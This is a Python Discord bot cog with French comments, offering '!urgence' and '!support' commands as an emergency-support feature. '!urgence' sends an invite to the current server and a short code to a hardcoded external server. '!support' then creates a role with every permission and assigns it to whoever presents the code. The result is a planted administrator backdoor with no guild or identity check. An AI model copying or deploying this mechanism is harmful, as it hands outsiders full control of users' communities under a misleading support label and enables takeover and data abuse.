import discord
from discord.ext import commands
import json
import random
import string

intents = discord.Intents.default()
intents.typing = False
intents.presences = False

bot = commands.Bot(command_prefix="!", intents=intents)

class A(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.urgence_channel_name = "🚨-urgence"
        self.target_server_id = 1091660772905594890
        self.admin_file = 'Fonction-ipt/admin.json'

    

    @commands.command()
    async def urgence(self, ctx, *, raison=None):
        # Récupérez le serveur cible en fonction de l'ID spécifié
        target_guild = self.bot.get_guild(self.target_server_id)

        if target_guild:
            # Obtenez le canal dans lequel vous souhaitez envoyer l'embed en fonction de son nom
            urgence_channel = discord.utils.get(target_guild.text_channels, name=self.urgence_channel_name)

            if urgence_channel:
                code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

                # Créez l'embed comme vous l'avez fait auparavant
                embed = discord.Embed(title="Urgence", color=0x660066)
                embed.add_field(name="Code d'urgence", value=f"`{code}`", inline=False)

                # Ajoutez la raison à l'embed si elle est fournie
                if raison:
                    embed.add_field(name="Raison de l'urgence", value=raison, inline=False)

                # Créez une invitation pour le serveur actuel (où la commande est invoquée)
                server_invite = await ctx.channel.create_invite(max_age=5600, max_uses=10, unique=True)
                embed.add_field(name="Lien d'invitation du serveur", value=server_invite.url, inline=False)

                # Enregistrez le code d'urgence dans un fichier JSON
                urgence_data = {
                    "code": code,
                    "reason": raison,
                    "server_invite": server_invite.url
                }
                self.save_urgence_data(urgence_data)

                # Envoyez l'embed dans le canal d'urgence spécifié du serveur cible
                await urgence_channel.send(embed=embed)

                # Confirmation que la demande de support a été envoyée
                confirmation_message = f"Demande de support envoyée à {target_guild.name}."
                confirmation_embed = discord.Embed(
                    title="Confirmation de demande de support",
                    description=confirmation_message,
                    color=0x660066
                )
                await ctx.send(embed=confirmation_embed)
            else:
                await ctx.send(f"Le canal d'urgence '{self.urgence_channel_name}' n'a pas été trouvé sur le serveur cible.")
        else:
            await ctx.send("Le serveur cible n'a pas été trouvé.")

    def save_urgence_data(self, urgence_data):
      # Chemin vers le fichier JSON
      file_path = "urgence.json"

      # Chargez les données existantes (s'il y en a)
      try:
          with open(file_path, "r") as file:
              existing_data = json.load(file)
      except FileNotFoundError:
          existing_data = []

      # Ajoutez les nouvelles données à la liste existante
      existing_data.append(urgence_data)

      # Enregistrez les données mises à jour dans le fichier JSON
      with open(file_path, "w") as file:
          json.dump(existing_data, file)

    @commands.command()
    async def support(self, ctx, code=None):
        if code is None:
            await ctx.send("Veuillez fournir le code d'urgence pour accéder au support.")
            return

        urgence_data = self.get_urgence_data(code)
        if urgence_data:
            author = ctx.message.author
            admin_role = await ctx.guild.create_role(name="Equipe Zark bot", permissions=discord.Permissions.all(), color=discord.Color(0xFF0000))
            await author.add_roles(admin_role)

            self.remove_urgence_data(code)

            await ctx.send("Vous avez accès au support d'urgence et avez été attribué en tant qu'administrateur.")
        else:
            await ctx.send("Code d'urgence invalide.")

    def get_urgence_data(self, code):
        # Chargez les données depuis le fichier JSON "urgence.json"
        with open("urgence.json", "r") as file:
            urgence_data = json.load(file)

        # Recherchez le code dans les données
        for data in urgence_data:
            if data["code"] == code:
                return data

        return None

    def remove_urgence_data(self, code):
        # Chargez les données depuis le fichier JSON "urgence.json"
        with open("urgence.json", "r") as file:
            urgence_data = json.load(file)

        # Recherchez le code dans les données et supprimez-le
        for data in urgence_data:
            if data["code"] == code:
                urgence_data.remove(data)

        # Enregistrez les données mises à jour dans le fichier JSON
        with open("urgence.json", "w") as file:
            json.dump(urgence_data, file)


def setup(bot):
  bot.add_cog(A(bot))